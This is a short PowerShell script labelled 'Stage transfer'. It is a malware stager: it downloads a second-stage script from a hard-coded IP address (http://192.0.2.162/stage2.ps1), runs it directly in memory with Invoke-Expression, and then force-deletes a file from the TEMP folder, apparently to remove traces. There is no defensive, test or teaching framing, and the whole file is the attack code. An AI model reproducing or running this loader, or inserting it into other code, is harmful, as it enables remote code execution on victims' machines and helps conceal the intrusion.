
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://192.0.2.162/stage2.ps1',
    [int]$RequestTimeout = 30
)
IEX (Invoke-WebRequest -Uri $PayloadUrl -UseBasicParsing).Content
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
